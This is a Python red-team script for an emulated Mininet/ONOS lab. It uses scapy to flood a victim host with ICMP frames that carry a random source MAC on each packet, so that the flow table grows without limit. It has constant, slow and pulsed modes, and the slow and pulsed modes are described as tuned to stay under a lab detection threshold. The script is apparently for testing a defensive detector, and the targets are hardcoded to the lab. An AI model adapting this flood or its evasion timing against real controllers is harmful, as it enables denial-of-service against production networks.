#!/usr/bin/env python3
"""
Sentinel red-team: random-source-MAC flood (the Lab 2 "Spiger" attack).

This is the Lab 2 control-plane flood, rewritten so run_scenario.py can start
it with mnexec instead of a manual xterm. It is meant to run ONLY inside the
emulated Mininet lab, from h1 toward h6. It forges ICMP echo frames whose
SOURCE MAC is random on every packet, so ONOS's reactive forwarding (which
keys flows on in_port+eth_src+eth_dst) treats each packet as a brand-new flow
and installs rules for it. The flow table then grows without bound.

One engine covers three scenarios, by rate and duty cycle:
  S4 flood   --rate 80                      constant high rate
  S5 slow    --rate 8                       low and steady, aims to stay under
                                            the Lab 2 rule (30 new flows/s, 3 s)
  S6 pulsed  --rate 80 --on 2 --off 6       bursts with quiet gaps, so the 3 s
                                            sustained test never trips

Run inside h1's namespace (run_scenario.py does this for you):
  sudo mnexec -a <h1-pid> python3 scenarios/attacks/flood.py --rate 80 --duration 60

Standalone test from h1's xterm:
  python3 scenarios/attacks/flood.py --rate 20 --duration 10
"""

import argparse
import os
import random
import sys
import time

from scapy.all import Ether, IP, ICMP, sendp

# Lab targets, fixed by topo/lab_topo.py. The attack is hardcoded to the lab
# so it cannot be pointed at anything else.
IFACE = "h1-eth0"           # only exists inside h1's namespace
VICTIM_IP = "10.0.3.2"      # h6
VICTIM_MAC = "00:00:00:00:00:06"


def random_mac():
    """A locally-administered, unicast random MAC (first octet 0x02)."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255)
                                                 for _ in range(5))


def one_packet():
    """One ICMP echo to h6 with a fresh random source MAC."""
    return (Ether(src=random_mac(), dst=VICTIM_MAC) /
            IP(src="10.0.1.1", dst=VICTIM_IP) /
            ICMP())


def send_burst(n):
    """Send n packets, each a new flow from ONOS's point of view."""
    pkts = [one_packet() for _ in range(n)]
    sendp(pkts, iface=IFACE, verbose=False)


def main():
    p = argparse.ArgumentParser(description="Lab random-source-MAC flood")
    p.add_argument("--rate", type=int, default=80,
                   help="packets per second while sending (default 80)")
    p.add_argument("--duration", type=int, default=60,
                   help="total seconds the attack runs (default 60)")
    p.add_argument("--on", type=float, default=0.0,
                   help="pulsed mode: seconds of sending per burst (0 = constant)")
    p.add_argument("--off", type=float, default=0.0,
                   help="pulsed mode: quiet seconds between bursts")
    args = p.parse_args()

    if not os.path.exists("/sys/class/net/%s" % IFACE):
        sys.exit("%s not found. Run this inside h1 (mnexec -a <h1-pid> ...)."
                 % IFACE)

    pulsed = args.on > 0
    end = time.time() + args.duration
    sent = 0
    print("flood: rate=%d/s duration=%ds %s" %
          (args.rate, args.duration,
           "pulsed on=%.1f off=%.1f" % (args.on, args.off) if pulsed
           else "constant"), flush=True)

    try:
        while time.time() < end:
            if pulsed:
                # Send at --rate for --on seconds, then go quiet for --off.
                burst_end = min(time.time() + args.on, end)
                while time.time() < burst_end:
                    send_burst(args.rate)
                    sent += args.rate
                    time.sleep(1)
                time.sleep(args.off)
            else:
                # One batch of --rate packets each second.
                send_burst(args.rate)
                sent += args.rate
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    print("flood: stopped after %d packets" % sent, flush=True)


if __name__ == "__main__":
    main()
